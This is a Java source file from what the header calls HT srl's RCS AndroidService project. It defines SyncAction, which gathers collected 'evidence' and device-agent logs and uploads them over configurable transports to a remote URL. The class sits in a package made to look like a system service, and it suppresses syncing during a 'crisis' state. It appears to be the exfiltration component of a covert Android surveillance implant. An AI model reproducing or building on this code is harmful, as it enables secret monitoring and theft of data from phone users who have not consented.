/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SyncAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import java.util.Date;
import java.util.Vector;

import android.util.Log;

import com.android.service.action.sync.Protocol;
import com.android.service.action.sync.ProtocolException;
import com.android.service.action.sync.Transport;
import com.android.service.action.sync.ZProtocol;
import com.android.service.agent.AgentManager;
import com.android.service.agent.AgentType;
import com.android.service.auto.Cfg;
import com.android.service.evidence.EvidenceCollector;
import com.android.service.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class SyncAction.
 */
public abstract class SyncAction extends SubAction {

	private static final String TAG = "SyncAction";

	/** The log collector. */
	protected EvidenceCollector logCollector;

	/** The agent manager. */
	protected AgentManager agentManager;
	// protected Transport[] transports = new Transport[Transport.NUM];
	/** The transports. */
	protected Vector transports;

	/** The protocol. */
	protected Protocol protocol;

	/** The initialized. */
	protected boolean initialized;

	/**
	 * Instantiates a new sync action.
	 * 
	 * @param type
	 *            the action id
	 * @param confParams
	 *            the conf params
	 */
	public SyncAction(final int type, final byte[] confParams) {
		super(type, confParams);

		logCollector = EvidenceCollector.self();
		agentManager = AgentManager.self();
		transports = new Vector();

		protocol = new ZProtocol();
		initialized = parse(confParams);
		initialized &= initTransport();
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {
		if (Cfg.DEBUG) {
			Check.requires(protocol != null, "execute: null protocol");
		}
		if (Cfg.DEBUG) {
			Check.requires(transports != null, "execute: null transports");
		}

		if (status.synced == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "Already synced in this action: skipping");
			}
			return false;
		}

		if (status.crisisSync()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "SyncAction - no sync, we are in crisis");
			}
			return false;
		}

		if (Cfg.DEMO) {
			// Questa chiamata da una RunTimeException
			// Toast.makeText(Status.getAppContext(), "Sync action",
			// Toast.LENGTH_LONG).show();
		}

		agentManager.reload(AgentType.AGENT_DEVICE);
		agentManager.resetIncrementalLogs();

		boolean ret = false;

		for (int i = 0; i < transports.size(); i++) {
			final Transport transport = (Transport) transports.elementAt(i);
			if (Cfg.DEBUG) {
				Check.log(TAG + " execute transport: " + transport);
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " transport Sync url: " + transport.getUrl());
			}

			if (transport.isAvailable()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " execute: transport available");
				}
				protocol.init(transport);

				try {
					Date before, after;
					if (Cfg.DEBUG) {
						before = new Date();
					}

					ret = protocol.perform();

					// transport.close();

					if (Cfg.DEBUG) {
						after = new Date();
						final long elapsed = after.getTime() - before.getTime();
						Log.d("QZ", TAG + " (execute): elapsed=" + elapsed / 1000);
					}

				} catch (final ProtocolException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Error: " + e.toString());
					}
					ret = false;
				}

				// wantUninstall = protocol.uninstall;
				// wantReload = protocol.reload;

			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " execute: transport not available");
				}
			}

			if (ret) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Info: SyncAction OK");
				}
				status.synced = true;
				return true;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: SyncAction Unable to perform");
			}
		}

		return false;
	}

	/**
	 * Parses the.
	 * 
	 * @param confParams
	 *            the conf params
	 * @return true, if successful
	 */
	@Override
	protected abstract boolean parse(final byte[] confParams);

	/**
	 * Inits the transport.
	 * 
	 * @return true, if successful
	 */
	protected abstract boolean initTransport();
}